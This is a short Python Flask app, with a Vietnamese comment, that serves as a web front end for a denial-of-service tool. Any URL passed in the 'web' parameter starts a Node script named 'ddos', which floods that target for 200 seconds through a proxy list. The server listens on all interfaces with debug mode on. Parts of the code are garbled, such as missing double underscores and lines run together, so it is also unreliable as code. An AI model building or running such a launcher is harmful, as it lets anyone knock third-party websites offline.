from flask import Flask, request, jsonify import subprocess

app = Flask(name)

@app.route('/') def index(): web = request.args.get('web') if not web: return jsonify({"error": "Missing 'web' parameter"}), 400

# Gọi lệnh node ddos
cmd = ["node", "ddos", "GET", web, "200", "64", "128", "prx27-1.txt"]
subprocess.Popen(cmd)

return jsonify({
    "Time": "200s",
    "Web": web
})

if name == 'main': app.run(host='0.0.0.0', port=5000, debug=True)

